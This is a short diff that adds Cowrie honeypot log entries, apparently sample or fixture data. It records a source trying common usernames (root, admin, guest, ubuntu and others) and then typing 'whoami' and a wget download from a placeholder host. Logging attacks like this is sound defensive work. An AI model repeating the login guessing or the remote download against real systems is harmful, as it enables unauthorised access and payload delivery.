@@ -1,0 +1,7 @@
+{"eventid":"cowrie.login.failed","src_ip":"192.0.2.10","username":"root"}
+{"eventid":"cowrie.login.failed","src_ip":"192.0.2.10","username":"admin"}
+{"eventid":"cowrie.login.failed","src_ip":"192.0.2.10","username":"test"}
+{"eventid":"cowrie.login.failed","src_ip":"192.0.2.10","username":"guest"}
+{"eventid":"cowrie.login.failed","src_ip":"192.0.2.10","username":"ubuntu"}
+{"eventid":"cowrie.command.input","src_ip":"192.0.2.10","input":"whoami"}
+{"eventid":"cowrie.command.input","src_ip":"192.0.2.10","input":"wget example.invalid/file"}
